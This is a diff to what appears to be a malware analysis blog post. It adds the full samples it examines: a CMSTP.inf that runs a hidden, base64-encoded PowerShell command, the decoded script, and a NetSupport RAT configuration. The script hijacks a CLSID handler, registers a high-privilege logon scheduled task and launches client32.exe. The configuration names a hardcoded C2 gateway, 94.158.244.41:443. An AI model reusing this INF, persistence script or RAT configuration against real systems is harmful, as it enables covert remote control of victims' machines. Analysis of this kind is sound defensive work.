@@ -383,9 +383,51 @@ Finally, the script creates functions to get a handle to a running process, and 
 
 CMSTP.inf is designed to be executed and run the encoded powershell command.
 
+`CMSTP.inf`
+<details>
+	<summary>Click to expand</summary>
+    <pre>
+	[version]
+    Signature =$chicago$
+    AdvancedINF = 2.5
+    [DefaultInstall]
+    CustomDestination = CustInstDestSectionAllUsers
+    RunPreSetupCommands = RunPreSetupCommandsSection
+    [RunPreSetupCommandsSection]
+    ;
+                
+    powershell.exe -ExecutionPolicy unrestricted -WindowStyle hidden -Encoded " UgBFAEcAIABBAGQAZAAgACIASABLAEUAWQBfAEMATABBAFMAUwBFAFMAXwBSAE8ATwBUAFwAQwBMAFMASQBEAFwAewA2ADQANQBGAEYAMAA0ADAALQA1ADAAOAAxAC0AMQAwADEAQgAtADkARgAwADgALQAwADAAQQANAAoAIAAgACAAIAAgACAAIAAgAEEAMAAwADIARgA5ADUANABFAH0AXABzAGgAZQBsAGwAXABvAHAAZQBuAFwAYwBvAG0AbQBhAG4AZAAiACAALwBmACAALwB2AGUAIAAvAHQAIABSAEUARwBfAFMAWgAgAC8AZAAgAFoAOgBcAFcASQBOADEAMAAtAFIARQAtAFMAaABhAHIAZQBkAFwANwAtADIAOAAtADIAMwBcAEMAcgBlAGEAdABpAG8AbgBUAG8AbwBsAHMAXABjAGwAaQBlAG4AdAAzADIALgBlAHgAZQANAAoAIAAgACAAIAAgACAAIAAgACQAQQBjAHQAaQBvAG4AIAA9ACAAKABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIABaADoAXABXAEkATgAxADAALQBSAEUALQBTAGgAYQByAGUAZABcADcALQAyADgALQAyADMAXABDAHIAZQBhAHQAaQBvAG4AVABvAG8AbABzAFwAYwBsAGkAZQBuAHQAMwAyAC4AZQB4AGUAKQANAAoAIAAgACAAIAAgACAAIAAgACQAVAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0AQQB0AEwAbwBnAE8AbgANAAoAIAAgACAAIAAgACAAIAAgAFIAZQBnAGkAcwB0AGUAcgAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAIAAtAFQAYQBzAGsATgBhAG0AZQAgACIAQgBhAGMAawBnAHIAbwB1AG4AZABDAGgAZQBjAGsAIgAgAC0AQQBjAHQAaQBvAG4AIAAkAEEAYwB0AGkAbwBuACAALQBUAHIAaQBnAGcAZQByACAAJABUAHIAaQBnAGcAZQByACAALQBSAHUAbgBMAGUAdgBlAGwAIAAiAEgAQwBoAGUAYwBrAFAAYQB0AGgAXwBVAG4AegBpAHAAZQBzAHQADQAKACAAIAAgACAAIAAgACAAIAAiACAALQBGAG8AcgBjAGUADQAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAWgA6AFwAVwBJAE4AMQAwAC0AUgBFAC0AUwBoAGEAcgBlAGQAXAA3AC0AMgA4AC0AMgAzAFwAQwByAGUAYQB0AGkAbwBuAFQAbwBvAGwAcwBcAGMAbABpAGUAbgB0ADMAMgAuAGUAeABlAA=="
+    taskkill /IM cmstp.exe /F
+    [CustInstDestSectionAllUsers]
+    49000,49001=AllUSer_LDIDSection, 7
+    [AllUSer_LDIDSection]
+    "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+    [Strings]
+    ServiceName="Notepad"
+    ShortSvcName="Notepad"
+
+    </pre>
+</details>
+
+
 [![7-31-23_19-1.png](/assets/images/7-31-23/7-31-23_19-1.png)](/assets/images/7-31-23/7-31-23_19-1.png)
 
-When run, this will run the following powershell
+When run, this will run the following via powershell
+
+`Powershell`
+<details>
+	<summary>Click to expand</summary>
+    <pre>
+	    REG Add "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00A
+        A002F954E}\shell\open\command" /f /ve /t REG_SZ /d Z:\WIN10-RE-Shared\7-28-23\CreationTools\client32.exe
+        $Action = (New-ScheduledTaskAction -Execute Z:\WIN10-RE-Shared\7-28-23\CreationTools\client32.exe)
+        $Trigger = New-ScheduledTaskTrigger -AtLogOn
+        Register-ScheduledTask -TaskName "BackgroundCheck" -Action $Action -Trigger $Trigger -RunLevel "High
+        " -Force
+        Start-Process Z:\WIN10-RE-Shared\7-28-23\CreationTools\client32.exe
+    </pre>
+</details>
+
 
 [![7-31-23_20-1.png](/assets/images/7-31-23/7-31-23_20-1.png)](/assets/images/7-31-23/7-31-23_20-1.png)
 
@@ -398,6 +440,56 @@ So what is client32.exe?
 Netsupport RAT!
 
 And the zip folder was kind enough to inclued a .ini file with the C2 IP hardcoded for us
+
+`client32.ini`
+<details>
+	<summary>Click to expand</summary>
+    <pre>
+	0xbce4e7c6
+
+    [Client]
+    _present=1
+    AlwaysOnTop=1
+    DisableChat=1
+    DisableChatMenu=1
+    DisableClientConnect=1
+    DisableCloseApps=0
+    DisableDisconnect=1
+    DisableManageServices=0
+    DisableReplayMenu=1
+    DisableRequestHelp=1
+    HideWhenIdle=1
+    Protocols=3
+    RoomSpec=Eval
+    SecurityKey2=dgAAAKJfJmpmHKBcaX0fSFo1T)UA
+    silent=1
+    SKMode=1
+    SysTray=0
+    UnloadMirrorOnDisconnect=1
+    Usernames=*
+
+    [_Info]
+    Filename=C:\Program Files (x86)\NetSupport\NetSupport Manager\client32u.ini
+
+    [_License]
+    quiet=1
+
+    [Audio]
+    DisableAudioFilter=1
+
+    [Bridge]
+    Modem=SSTP
+
+    [General]
+    BeepUsingSpeaker=0
+
+    [HTTP]
+    GatewayAddress=94.158.244.41:443
+    GSK=GD;H?NDBFFHK=A@GDM:C@AEI;C@C
+    Port=443
+
+    </pre>
+</details>
 
 [![7-31-23_20.png](/assets/images/7-31-23/7-31-23_20.png)](/assets/images/7-31-23/7-31-23_20.png)
 
